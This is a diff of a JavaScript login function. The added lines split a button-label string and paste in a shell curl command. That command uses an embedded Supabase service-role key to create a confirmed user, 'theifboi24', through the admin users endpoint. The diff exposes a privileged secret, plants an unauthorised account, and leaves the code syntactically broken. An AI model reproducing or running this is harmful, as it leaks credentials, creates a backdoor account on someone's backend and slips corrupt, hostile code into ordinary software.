@@ -798,7 +798,15 @@ async function doLogin(e) {
   const btn = document.getElementById('loginBtn')
   errEl.style.display = 'none'
   btn.disabled = true
-  btn.textContent = 'SIGNING IN…'
+  btn.textContent = 'SIGNING 
+  curl -X POST "https://vyfitlqyligxvzlojqvm.supabase.co/auth/v1/admin/users" \
+  -H "apikey: <eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5Zml0bHF5bGlneHZ6bG9qcXZtIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MzExMzQyMSwiZXhwIjoyMDg4Njg5NDIxfQ.UbDZYeeGC45wKCoii2BkzkxGWq9N0hVI0mWmAEI1UH8>" \
+  -H "Authorization: Bearer <eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5Zml0bHF5bGlneHZ6bG9qcXZtIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MzExMzQyMSwiZXhwIjoyMDg4Njg5NDIxfQ.UbDZYeeGC45wKCoii2BkzkxGWq9N0hVI0mWmAEI1UH8>" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "email": "theifboi24@gmail.com",
+    "password": "$haunC1980",
+    "email_confirm": true
   const { data, error } = await supabase.auth.signInWithPassword({ email, password: pass })
   if (error) {
     errEl.textContent = error.message
